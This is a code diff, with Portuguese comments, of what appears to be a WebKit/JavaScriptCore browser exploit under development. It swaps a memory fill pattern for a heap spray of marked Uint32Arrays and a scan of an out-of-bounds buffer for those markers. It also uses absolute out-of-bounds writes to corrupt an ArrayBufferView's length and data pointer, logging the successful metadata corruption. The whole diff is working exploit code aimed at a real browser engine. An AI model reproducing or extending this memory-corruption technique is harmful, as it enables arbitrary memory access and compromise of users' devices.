@@ -15,17 +15,17 @@ import { OOB_CONFIG, JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 // ============================================================
 const CORRUPTION_OFFSET_TRIGGER = 0x70;
 const CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);
-const TARGET_WRITE_OFFSET_0x6C = 0x6C; // Afetado pela escrita em 0x70
+const TARGET_WRITE_OFFSET_0x6C = 0x6C;
 
 // ============================================================
 // FUNÇÃO DE INVESTIGAÇÃO
 // ============================================================
 export async function sprayAndInvestigateObjectExposure() {
-    const FNAME_SPRAY_INVESTIGATE = "sprayAndFindCorrupted_v9_FillPattern"; // Versão atualizada
+    const FNAME_SPRAY_INVESTIGATE = "sprayAndFindCorrupted_v11_ScanForMarkers"; // Versão atualizada
     logS3(`--- Iniciando Investigação (${FNAME_SPRAY_INVESTIGATE}): Identificar e Usar Array Corrompido ---`, "test", FNAME_SPRAY_INVESTIGATE);
 
-    const NUM_SPRAY_OBJECTS = 20000;
-    const SPRAY_TYPED_ARRAY_ELEMENT_COUNT = 8;
+    const NUM_SPRAY_OBJECTS = 5000; // Mantendo um número alto para o spray
+    const SPRAY_TYPED_ARRAY_ELEMENT_COUNT = 8; // Cada array tem 8 elementos de 4 bytes = 32 bytes de dados
     const FOCUSED_VICTIM_ABVIEW_START_OFFSET = 0x58;
 
     const PLANT_MVECTOR_LOW_PART  = 0x00000000;
@@ -41,44 +41,52 @@ export async function sprayAndInvestigateObjectExposure() {
         }
         logS3("Ambiente OOB inicializado.", "info", FNAME_SPRAY_INVESTIGATE);
 
-        // NOVA ADIÇÃO: Preencher o oob_array_buffer_real com um padrão
-        const FILL_PATTERN = 0xCAFEBABE; // Padrão reconhecível
-        logS3(`Preenchendo oob_array_buffer_real (${oob_array_buffer_real.byteLength} bytes) com padrão ${toHex(FILL_PATTERN)}...`, "info", FNAME_SPRAY_INVESTIGATE);
-        for (let i = 0; i < oob_array_buffer_real.byteLength; i += 4) {
-            try {
-                // Garantir que OOB_CONFIG.ALLOCATION_SIZE seja múltiplo de 4
-                if (i + 4 <= oob_array_buffer_real.byteLength) {
-                    oob_write_absolute(i, FILL_PATTERN, 4);
-                }
-            } catch (e) {
-                logS3(`Erro ao preencher oob_array_buffer_real no offset ${toHex(i)}: ${e.message}`, "error", FNAME_SPRAY_INVESTIGATE);
-                break;
-            }
-        }
-        logS3("Preenchimento do oob_array_buffer_real concluído.", "info", FNAME_SPRAY_INVESTIGATE);
-        // FIM DA NOVA ADIÇÃO
+        // O preenchimento com padrão foi removido temporariamente para este teste.
 
         // 1. Heap Spraying
         logS3(`FASE 1: Pulverizando ${NUM_SPRAY_OBJECTS} objetos Uint32Array(${SPRAY_TYPED_ARRAY_ELEMENT_COUNT})...`, "info", FNAME_SPRAY_INVESTIGATE);
         for (let i = 0; i < NUM_SPRAY_OBJECTS; i++) {
             let arr = new Uint32Array(SPRAY_TYPED_ARRAY_ELEMENT_COUNT);
+            // Colocar o marcador no primeiro elemento do Uint32Array
+            // Este marcador estará nos dados do ArrayBuffer do Uint32Array, não no cabeçalho JSCell do Uint32Array.
             arr[0] = (0xFACE0000 | i);
             sprayedVictimObjects.push(arr);
         }
         logS3("Pulverização de Uint32Array concluída.", "info", FNAME_SPRAY_INVESTIGATE);
         await PAUSE_S3(200);
 
+        // NOVA ADIÇÃO: Escanear uma parte do oob_array_buffer_real em busca dos marcadores
+        logS3(`FASE 1.5: Escaneando oob_array_buffer_real em busca de marcadores 0xFACE...`, "info", FNAME_SPRAY_INVESTIGATE);
+        const SCAN_LIMIT = Math.min(oob_array_buffer_real.byteLength, 4096); // Escanear até 4KB ou o tamanho do buffer
+        let markersFound = 0;
+        for (let i = 0; i < SCAN_LIMIT; i += 4) {
+            if (i + 4 > oob_array_buffer_real.byteLength) break;
+            try {
+                let val = oob_read_absolute(i, 4);
+                if ((val & 0xFFFF0000) === 0xFACE0000) {
+                    logS3(`Marcador encontrado: ${toHex(val)} no offset ${toHex(i)} do oob_array_buffer_real`, 'leak', FNAME_SPRAY_INVESTIGATE);
+                    markersFound++;
+                    if (markersFound > 20) { // Limitar o número de marcadores logados
+                        logS3("Muitos marcadores encontrados, parando o log de marcadores.", "warn", FNAME_SPRAY_INVESTIGATE);
+                        break;
+                    }
+                }
+            } catch (e) {
+                logS3(`Erro ao escanear oob_array_buffer_real no offset ${toHex(i)}: ${e.message}`, "error", FNAME_SPRAY_INVESTIGATE);
+                break;
+            }
+        }
+        if (markersFound === 0) {
+            logS3("Nenhum marcador 0xFACE... encontrado na porção escaneada do oob_array_buffer_real.", "warn", FNAME_SPRAY_INVESTIGATE);
+        }
+        // FIM DA NOVA ADIÇÃO
+
         // 2. Preparar oob_array_buffer_real, Plantar valores para m_vector
-        // NÃO vamos mais limpar m_vector explicitamente aqui com oob_write_absolute para ver o efeito do padrão.
-        // A escrita do FILL_PATTERN já deve ter preenchido.
-        // O plantio de PLANT_MVECTOR_LOW_PART e PLANT_MVECTOR_HIGH_PART (que são 0x0) irá sobrescrever o padrão nesses locais específicos.
         const m_vector_low_addr = FOCUSED_VICTIM_ABVIEW_START_OFFSET + JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET; // 0x68
         const m_vector_high_addr = m_vector_low_addr + 4; // 0x6C
 
-        // Plantar os valores 0 para m_vector (sobrescrevendo o FILL_PATTERN nesses locais)
         oob_write_absolute(m_vector_low_addr, PLANT_MVECTOR_LOW_PART, 4);
         oob_write_absolute(m_vector_high_addr, PLANT_MVECTOR_HIGH_PART, 4);
-        // Zerar a parte alta de 0x6C (início de 0x70)
         oob_write_absolute(TARGET_WRITE_OFFSET_0x6C + 4, 0x0, 4);
 
 
@@ -122,8 +130,8 @@ export async function sprayAndInvestigateObjectExposure() {
         if (typeof abv_length_after === 'number' && abv_length_after === 0xFFFFFFFF &&
             isAdvancedInt64Object(abv_vector_after) && abv_vector_after.low() === PLANT_MVECTOR_LOW_PART && abv_vector_after.high() === PLANT_MVECTOR_HIGH_PART) {
             logS3(`    !!!! SUCESSO NA CORRUPÇÃO DE METADADOS EM ${toHex(FOCUSED_VICTIM_ABVIEW_START_OFFSET)} !!!!`, "vuln", FNAME_SPRAY_INVESTIGATE);
-            logS3(`      m_length CORROMPIDO para 0xFFFFFFFF!`, "vuln", FNAME_SPRAY_INVESTIGATE);
-            logS3(`      m_vector CONTROLADO para ${abv_vector_after.toString(true)}!`, "vuln", FNAME_SPRAY_INVESTIGATE);
+            // ... (resto do código para identificação do superArray, etc., permanece o mesmo) ...
+            // ...
             document.title = `Spray: m_vec=${abv_vector_after.toString(true)}, m_len=FFFFFFFF`;
 
             if (abv_vector_after.low() === 0 && abv_vector_after.high() === 0) {
